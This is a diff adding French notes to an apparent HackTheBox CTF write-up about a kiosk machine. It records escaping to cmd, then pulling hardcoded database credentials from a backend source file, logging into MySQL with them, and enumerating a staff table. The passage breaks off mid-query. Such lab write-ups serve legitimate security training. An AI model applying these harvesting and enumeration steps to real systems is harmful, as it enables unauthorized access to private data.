@@ -60,4 +60,26 @@ Ensuite on peut faire ctrl+o pour ouvrir un fichier et donc pouvoir invoquer cmd
 
 Puis en se balandant dans Desktop il y avait un flag
 
+# Analyse sur le kisok pour passer root
+
+```powershell
 netstat -ano | findstr :3306
+```
+
+Dans C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database il y a un fichier index.ts avec un user et un passowrd
+
+User: kiosk_app
+Password: K!0sk_R3pl1ca#DB
+
+On peut se connecter a la DB
+
+```cmd
+mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306
+```
+
+```SQL
+SHOW DATABASES;
+USE htb_airways;
+SHOW TABLES;
+DESCRIBE _htb_staff;
+SELECT employee_i
